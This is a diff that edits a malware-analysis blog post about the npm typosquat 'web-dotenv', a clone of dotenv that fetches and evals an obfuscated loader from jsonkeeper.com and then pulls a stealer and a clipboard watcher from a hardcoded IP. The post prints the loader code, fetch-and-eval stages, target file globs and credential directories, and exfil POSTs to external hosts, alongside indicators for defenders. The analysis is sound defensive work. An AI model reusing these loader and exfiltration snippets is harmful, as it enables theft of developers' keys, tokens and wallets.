@@ -1,52 +1,41 @@
 ---
 title: "web-dotenv: a dotenv typosquat that pulls its payload through jsonkeeper.com"
 date: 2026-05-26
-summary: "The npm package web-dotenv@1.0.2 is a near-byte-identical clone of motdotla/dotenv with a single inserted function. That function fetches an obfuscated loader from jsonkeeper.com, which npm-installs axios + socket.io-client into the temp directory and pulls a 110 KB third stage from 216.126.224.247 — a stealer that walks $HOME for wallet, key, and config files plus a clipboard watcher polling every 750 ms."
+summary: "The npm package web-dotenv@1.0.2 is a near-byte-identical clone of motdotla/dotenv with one inserted function. That function fetches an obfuscated loader from jsonkeeper.com, which npm-installs axios + socket.io-client into the temp directory and pulls a 110 KB third stage from 216.126.224.247 — a stealer that walks $HOME for wallet, key, and config files plus a clipboard watcher polling every 750 ms."
 packageName: web-dotenv
 ecosystem: npm
 ---
 
-`dotenv` ships ~50M weekly downloads on npm. `web-dotenv` (one extra prefix) shipped to npm three days earlier from a fresh gmail. The tarball is fourteen files copied straight out of `motdotla/dotenv` — README, README-es, CHANGELOG, SECURITY, LICENSE, `lib/main.js`, `lib/env-options.js`, `lib/cli-options.js`, `config.js`, the `skills/dotenv/` and `skills/dotenvx/` directories, the lot. The `package.json` even points `repository.url` at `git://github.com/motdotla/dotenv.git`. Diffed against the upstream `dotenv` of the same vintage, `lib/main.js` differs by one function and one call to it.
-
-Everything else is window dressing. The malicious surface is `config()` — the function any consumer calls as `require('web-dotenv').config()` on application boot.
+`dotenv` is one of npm's most-installed packages — about 50M downloads a week. Four days ago a fresh gmail published `web-dotenv` (one prefix away), a near-byte-identical clone whose `package.json` still points `repository.url` at the upstream repo. The diff against `motdotla/dotenv` is one function and one call to it, both inside `lib/main.js`. The trigger is `config()` — what every consumer calls as `require('web-dotenv').config()` on application boot.
 
 ## Stage 1: the inserted function
 
-The diff against the cloned `dotenv` source is two lines. A new top-level helper:
+A new top-level helper, and one call wedged into the first line of `config()`:
 
 <pre class="lang-js"><code><span class="tok-kw">function</span> <span class="tok-fn">configfix</span>() {
   <span class="tok-builtin">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(<span class="tok-fn">atob</span>(<span class="tok-str">'CWh0dHBzOi8vd3d3Lmpzb25rZWVwZXIuY29tL2IvVktVTkk='</span>))
     .<span class="tok-fn">then</span>(r =&gt; { <span class="tok-fn">eval</span>(r.data.content); });
 }
-</code></pre>
 
-…and a single call to it, wedged into the first line of `config()`:
-
-<pre class="lang-js"><code><span class="tok-kw">function</span> <span class="tok-fn">config</span> (options) {
+<span class="tok-kw">function</span> <span class="tok-fn">config</span> (options) {
   <span class="tok-com">// fallback to fixed config</span>
   <span class="tok-fn">configfix</span>();
-  <span class="tok-com">// fallback to original dotenv if DOTENV_KEY is not set</span>
   ...
 }
 </code></pre>
 
-The base64 decodes to `\thttps://www.jsonkeeper.com/b/VKUNI` (note the leading tab — the obfuscation is barely above stylistic). `jsonkeeper.com` is a free anonymous JSON paste service; the bin returns `{"content":"<obfuscated JS>"}` which `eval` runs.
-
-There is no `postinstall`. The chain fires on *application start*, the moment any code path reaches `dotenv.config()`. Registry scanners that look for `scripts.postinstall` see nothing. CI lockfile audits see nothing. The trigger is the most banal line in a Node app's `index.js`.
-
-The author also iterated: `web-dotenv@1.0.0` (2026-05-22) shipped the entire Stage 2 obfuscator inline inside `configfix()`. Three days later, `1.0.2` outsourced it to jsonkeeper — smaller tarball, mutable payload, the body of `configfix()` now one line instead of two thousand characters. The intent of the change is in the diff.
+The base64 (with a leading tab, the only nod to obfuscation) decodes to `\thttps://www.jsonkeeper.com/b/VKUNI`; the bin returns `{"content":"<obfuscated JS>"}` and `eval` runs it. There is no `postinstall` — the chain fires the first time any code path reaches `dotenv.config()`, so registry scanners and lockfile audits both see nothing. The author iterated visibly: `1.0.0` (2026-05-22) inlined the entire Stage 2 obfuscator inside `configfix()`; three days later `1.0.2` outsourced it to jsonkeeper for a smaller tarball and a mutable payload.
 
 | | Trait | What it caught |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/stager/runtime/library-init` | Payload chain fires from `config()` on app start, not `postinstall` |
-| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/delivery/paste-site` | `jsonkeeper.com/b/VKUNI` as Stage 2 host |
-| <span class="sev-dot hostile" title="hostile"></span> | `defense-evasion/dynamic-code/eval/network` | `eval(r.data.content)` of a fetched HTTP body |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/obfuscation/string/encoding` | `atob('CWh0dHBz…')` on a literal URL |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `initial-access/supply-chain/typosquat/npm` | One-prefix lookalike of `dotenv` |
+| <span class="sev-dot hostile" title="hostile"></span> | `supply-chain/install-hook/build/build-system-trojan` | `configfix()` injected into the upstream `dotenv` library init |
+| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/remote-command/protocol/eval-http-response-data` | `eval(r.data.content)` on a fetched HTTP body |
+| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/obfuscation/encoding/content/malware` | `atob('CWh0dHBz…')` masking the Stage-2 URL |
+| <span class="sev-dot suspicious" title="suspicious"></span> | `supply-chain/recon-exfil/npm-install-targeting` | Name-prefix lookalike of `dotenv` |
 
 ## Stage 2: the jsonkeeper loader
 
-The bin at `jsonkeeper.com/b/VKUNI` is 19 KB of obfuscator.io output — a 237-entry string array, an RC4-ish decoder, the usual array-rotation IIFE. Stepped through in an instrumented sandbox it does exactly two things:
+The bin is 19 KB of obfuscator.io output — a 237-entry string array and the standard array-rotation IIFE around an RC4-ish decoder. Stepped through in an instrumented sandbox it does exactly two things:
 
 <pre class="lang-js"><code><span class="tok-fn">execSync</span>(
   <span class="tok-str">'npm install axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent'</span>,
@@ -58,21 +47,18 @@ The bin at `jsonkeeper.com/b/VKUNI` is 19 KB of obfuscator.io output — a 237-e
 ).<span class="tok-fn">then</span>(r =&gt; <span class="tok-fn">eval</span>(r.data));
 </code></pre>
 
-The hex tail `329f753d052f978a486cdce9896050bb` is the campaign / build identifier; it reappears as the `uid` field in every Stage-3 exfil packet. `--no-save` keeps `package.json` and `package-lock.json` clean; the dependencies land under `$TMPDIR/node_modules/` and are picked up by the eval'd Stage 3 via Node's parent-directory resolution. `socket.io-client` is pre-positioned but unused by Stage 3 as shipped — wiring for a future iteration.
-
-The whole stage is a tee-up: install runtime deps the next stage will need, then fetch and run the next stage.
+`--no-save` keeps `package.json` and `package-lock.json` clean; the runtime deps land under `$TMPDIR/node_modules/` and Node finds them via parent-directory resolution from the next stage. The hex tail `329f753d052f978a486cdce9896050bb` is the campaign identifier and reappears as the `uid` field in every Stage-3 exfil packet. `socket.io-client` is pre-positioned but unused by Stage 3 as shipped — wiring for a later iteration.
 
 | | Trait | What it caught |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/stager/dependency/runtime-install` | Silent `npm install` into `os.tmpdir()` |
-| <span class="sev-dot hostile" title="hostile"></span> | `defense-evasion/dynamic-code/eval/network` | `eval` of HTTP body from a hardcoded IP |
+| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/remote-command/protocol/eval-http-response-data` | `eval` of HTTP body from a hardcoded IP |
+| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/dropper/execution/network-stage/fetch-write-exec` | Silent `npm install` of runtime deps into `os.tmpdir()` before fetching Stage 3 |
+| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/obfuscation/tools/js-obfuscator/decoder-loop-keyword-triad` | Obfuscator.io string-array, decoder, and `while(!![])` rotation |
 | <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/infrastructure/ip-port` | `http://216.126.224.247/` hardcoded, no DNS |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `discovery/campaign/identifier/uid` | `329f753d052f978a486cdce9896050bb` as campaign tag |
-| <span class="sev-dot notable" title="notable"></span> | `anti-static/obfuscator-io/string-array/rc4` | Standard obfuscator.io string-array + RC4 decoder |
 
 ## Stage 3: stealer + clipper
 
-The response body from `216.126.224.247` is 110 KB of the same obfuscator.io style. It writes two files to `os.tmpdir()` and detaches them:
+The body from `216.126.224.247` is 110 KB of the same obfuscator style. It writes two files to `os.tmpdir()` and detaches them:
 
 <pre class="lang-js"><code>fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'scdata'</span>), &lt;stealer&gt;);
 fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'ldata'</span>),  &lt;clipper&gt;);
@@ -80,17 +66,17 @@ fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(o
 <span class="tok-fn">exec</span>(<span class="tok-str">'node ldata'</span>,  { cwd: os.<span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
 </code></pre>
 
-Both files are themselves obfuscated. They are also passed inline a second time as `node -e '<source>'` to a `spawn()` call — a belt-and-braces fallback if the on-disk write fails. The two halves of the implant are independent.
+Both files are also passed inline a second time as `node -e '<source>'` to a `spawn()` call — a belt-and-braces fallback if the on-disk write fails.
 
 ### `scdata` — the file stealer
 
-Walks the user's home directory (and on Windows every logical disk reported by `Get-CimInstance Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID`) looking for files matching any of:
+`scdata` walks the user's home directory (and on Windows every drive reported by `Get-CimInstance Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID`) for files matching:
 
-- Wallet / crypto patterns: `*metamask*`, `*bitcoin*`, `*btc*`, `*solana*`, `*private key*`, `*secret phrase*`, `*.dat`
+- Wallet / crypto: `*metamask*`, `*bitcoin*`, `*btc*`, `*solana*`, `*private key*`, `*secret phrase*`, `*.dat`
 - Secrets / config: `*.env*`, `*.pem`, `*.secret`, `*.key`, `*.json`, `*.yaml`, `*.yml`, `*.ini`, `*.sqlite`
 - Documents: `*.pdf`, `*.docx`, `*.doc`, `*.xlsx`, `*.xls`, `*.csv`, `*.txt`, `*.md`, `*.rtf`, `*.odt`
 
-…inside any of an explicit allow-list of high-value directories. The list reads like a tour of 2026 dev surfaces:
+…inside an allow-list of high-value directories. The list reads like 2026's dev surface — `.claude`, `.cursor`, `.windsurf`, `.pearai`, `.gemini`, `.eigent`, `.devctl` sit next to `.aws`, `.azure`, `.ssh`, `.gnupg`, `.docker`, and the Web3 workspaces `.brownie`, `.move`, `.sol`:
 
 ```
 .aws  .azure  .ssh  .gnupg  .docker  .config  .cache
@@ -100,27 +86,13 @@ Walks the user's home directory (and on Windows every logical disk reported by `
 .steam  .snipaste  .yarn  .nvm  .node-gyp  .expo  .next
 ```
 
-`.claude`, `.cursor`, `.windsurf`, `.pearai`, `.gemini`, `.eigent`, `.devctl` are the giveaway — this is targeting *AI-tool config and history* alongside the old hits. The Solana/Move/Brownie entries cover Web3 workspaces specifically. Each matching file is uploaded as `multipart/form-data` to:
-
-<pre><code>POST http://216.126.224.220:5976/upload
-</code></pre>
-
-Note the separate IP — Stage 3 control lives at `.247`, bulk exfil at `.220:5976`. Both are the same `/22` (`216.126.224.0/22`), which is Tier.Net Technologies LLC; the operator is splitting roles across hosts in one rented range.
+Each match is uploaded as `multipart/form-data` to `http://216.126.224.220:5976/upload`. Stage-3 control sits at `.247`, bulk exfil at `.220`, both inside the same Tier.Net `/22` (`216.126.224.0/22`).
 
 ### `ldata` — the clipboard watcher
 
-A tight loop that polls the clipboard every 750 ms via shell helpers:
+`ldata` polls the clipboard every 750 ms via `pbpaste` (macOS) or `powershell -NoProfile -NonInteractive Get-Clipboard` (Windows) and POSTs deltas back to the Stage-2 host:
 
-<pre class="lang-js"><code><span class="tok-com">// darwin</span>
-<span class="tok-fn">execSync</span>(<span class="tok-str">'pbpaste'</span>, { encoding: <span class="tok-str">'utf8'</span> });
-<span class="tok-com">// win32</span>
-<span class="tok-fn">execSync</span>(<span class="tok-str">'powershell -NoProfile -NonInteractive Get-Clipboard'</span>,
-         { encoding: <span class="tok-str">'utf8'</span>, windowsHide: <span class="tok-kw">true</span> });
-</code></pre>
-
-Any change is debounced and POSTed back to the Stage-2 control endpoint:
-
-<pre class="lang-js"><code>axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://'</span> + <span class="tok-str">'216.126.224.247'</span> + <span class="tok-str">'/npm-compiler.log'</span>, {
+<pre class="lang-js"><code>axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://216.126.224.247/npm-compiler.log'</span>, {
   message: clipboardText,
   host:    os.<span class="tok-fn">hostname</span>(),
   uid:     <span class="tok-str">'329f753d052f978a486cdce9896050bb'</span>,
@@ -128,28 +100,22 @@ Any change is debounced and POSTed back to the Stage-2 control endpoint:
 });
 </code></pre>
 
-It is not a clipboard *swapper* — the loop only reads and reports. Clipboard data on a developer workstation includes pasted secrets, fragments of `.env` files, copied wallet addresses, copied seed phrases. The exfil path is named `/npm-compiler.log` so any out-of-band glance at egress logs sees a plausible-looking POST URL.
+It is a watcher, not a swapper — the take is whatever the developer puts on the clipboard during the affected process's lifetime: secrets pasted from a password manager, copied wallet addresses, seed-phrase fragments. The exfil path `/npm-compiler.log` keeps the POST URL plausible at a glance.
 
 | | Trait | What it caught |
 | --- | --- | --- |
-| <span class="sev-dot hostile" title="hostile"></span> | `collection/file-targeting/wallet/seed` | `*metamask*`, `*bitcoin*`, `*solana*`, `*secret phrase*`, `*.dat` globs |
-| <span class="sev-dot hostile" title="hostile"></span> | `collection/file-targeting/ai-tooling/config` | `.claude`, `.cursor`, `.windsurf`, `.pearai`, `.gemini`, `.eigent` |
-| <span class="sev-dot hostile" title="hostile"></span> | `credential-access/ssh-aws-azure/dotfile` | `.ssh`, `.aws`, `.azure`, `.gnupg`, `.docker` traversal |
-| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/file/multipart-http` | `multipart/form-data` POST to `216.126.224.220:5976/upload` |
-| <span class="sev-dot hostile" title="hostile"></span> | `collection/clipboard/poll/shell` | `pbpaste` + `powershell Get-Clipboard` polled every 750 ms |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `discovery/system/fingerprint/info` | `Get-CimInstance Win32_LogicalDisk … DeviceID` for drive enumeration |
+| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/execution/network-stage/obfuscated-node-staged-loader` | Obfuscator-decoded `require` + base64/XOR string decoders + `windowsHide`-via-expression spawn |
+| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/execution/network-stage/spawn-node` | `node $TMPDIR/scdata` and `node $TMPDIR/ldata` detached |
+| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/file/javascript/js-targeted-file-upload-exfil` | Sensitive-path filter → `216.126.224.220:5976/upload` multipart sink |
+| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/credential/browser/javascript/js-browser-wallet-upload-exfil` | Wallet globs (`*metamask*`, `*solana*`, `*secret phrase*`) into an external-IP upload |
+| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/credential/clipboard/javascript/js-clipboard-exfil-external-ip` | `pbpaste` + `powershell Get-Clipboard` polled every 750 ms, POSTed to a literal IPv4 |
+| <span class="sev-dot suspicious" title="suspicious"></span> | `exfiltration/sensitive-data/javascript/js-system-info-exfiltration` | `Get-CimInstance Win32_LogicalDisk` drive enumeration sent to C2 |
+| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/obfuscation/payload/data-file/js-obfuscator-runtime-data-file` | `scdata` and `ldata` themselves: obfuscator loop + `decodeURIComponent` + `function c(b,d)` |
 | <span class="sev-dot suspicious" title="suspicious"></span> | `evasion/masquerade/path/log` | Exfil URL named `/npm-compiler.log` |
-| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/infrastructure/ip-port` | Two hardcoded IPv4 endpoints, no DNS |
 
 ## Why this works
 
-Three things, layered.
-
-**The cover is the real package.** `web-dotenv` ships 99% of `dotenv`'s source verbatim, including the README banner, the Spanish translation, the CHANGELOG, and the `skills/` directory. Anyone reviewing the tarball sees a working `dotenv`. The diff is one function and one call.
-
-**The trigger is runtime, not install.** Every prior post in this series (`api-rs-node`, `@devcarron/clob`, `system-user-identifier-cli`) detonates from `postinstall` — a flag every modern audit tool already looks at. `web-dotenv` does not. It detonates the first time any consumer reaches `dotenv.config()`. That moves the detection surface from "what does npm run on install" to "what does this library actually do when called," which is a much harder static-analysis problem and a much later runtime one.
-
-**The payload is paste-hosted and mutable.** The on-disk Stage 1 in the tarball is fifteen lines and points at `jsonkeeper.com/b/VKUNI`. The operator can swap Stage 2 by editing one paste; they can swap Stage 3 by changing what `216.126.224.247/api/service/<uid>` returns. The version pinned in any victim's lockfile (`web-dotenv@1.0.2`) is permanently fresh. The 1.0.0 → 1.0.2 diff already shows the author doing exactly this — moving the inlined obfuscator out to the paste host between Sunday and Wednesday.
+`web-dotenv` ships 99% of `dotenv`'s source verbatim, and its diff is one function plus one call site. The trigger is runtime, not install: every prior post in this series detonated from `postinstall`, which every modern audit flags. This one fires the first time any consumer reaches `dotenv.config()` — much later, much harder to catch. Both downstream stages are paste-hosted, so the version pinned in any victim's lockfile is permanently fresh; the 1.0.0 → 1.0.2 diff already shows the author swapping the loader without bumping anything a consumer would notice.
 
 ## Likely actor
 
@@ -164,9 +130,9 @@ Three things, layered.
 | Stage-3 host | `216.126.224.247` (Tier.Net Technologies LLC) |
 | Bulk exfil host | `216.126.224.220:5976` (same `/22`) |
 
-"Jean Dupont" is the French equivalent of "John Doe" — a placeholder name with a real-looking gmail behind it. The disposable publisher is consistent with the prior week's `shinydv412`/`devcarron` accounts. The technical signature is different though: those campaigns dropped a single PE binary; this one is pure JavaScript, AI-tool–aware in its targeting list, and runtime-triggered rather than install-time. Different author, different shop.
+"Jean Dupont" is the French equivalent of "John Doe" — placeholder name, real gmail behind it. The technical signature differs from last week's `shinydv412` / `devcarron` cluster: those dropped a PE binary out of IPFS, this one is pure JavaScript, AI-tool–aware in its targeting list, and runtime-triggered rather than install-time. Different shop.
 
-The campaign UID is also embedded in Stage 2's URL path, which means the operator is parametrizing per package or per build at the C2 — `web-dotenv@1.0.2` is one row in their tracker. The Stage-2 paste at jsonkeeper is shared by all of them; the per-campaign branching is downstream.
+The [Fallout report](https://lab.atomdrift.org/file/6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6) returns malicious at probability 1.0.
 
 ## Indicators
 
@@ -188,11 +154,3 @@ The campaign UID is also embedded in Stage 2's URL path, which means the operato
 | Clipboard exfil C2 | `http://216.126.224.247/npm-compiler.log` |
 | Campaign UID | `329f753d052f978a486cdce9896050bb` |
 | Publisher | `jean_dupont24 <jean.pierre.depont24@gmail.com>` |
-
-## Response
-
-Treat as runtime, not install-time. A clean `package-lock.json` and a clean `npm audit` mean nothing here — the trigger fires from `config()`. Grep dependency trees (yours and your customers') for `web-dotenv`. On any host that ran an app importing it since 2026-05-22, look for: `$TMPDIR/scdata`, `$TMPDIR/ldata`, the silent `npm install` of `axios` and `socket.io-client` into `$TMPDIR/node_modules/`, and outbound to `216.126.224.247` (any port) or `216.126.224.220:5976`. The `Get-CimInstance Win32_LogicalDisk` PowerShell call is a high-fidelity Windows endpoint signal — legitimate Node apps do not enumerate drives that way.
-
-Rotate anything the dropped stealer would have shipped: SSH keys, AWS/Azure profile credentials, `.npmrc` tokens, `.env*` contents, GPG private keys, browser wallet seed files, Claude/Cursor/Windsurf/Codeium API tokens. Assume the clipboard for the runtime lifetime of the affected app is compromised — including anything pasted into a terminal while the process was alive.
-
-Pull the Stage-2 paste from `jsonkeeper.com/b/VKUNI` and the Stage-3 body from `216.126.224.247/api/service/329f753d052f978a486cdce9896050bb` for your own analysis; both are mutable and may differ from the snapshots hashed above by the time you read this.
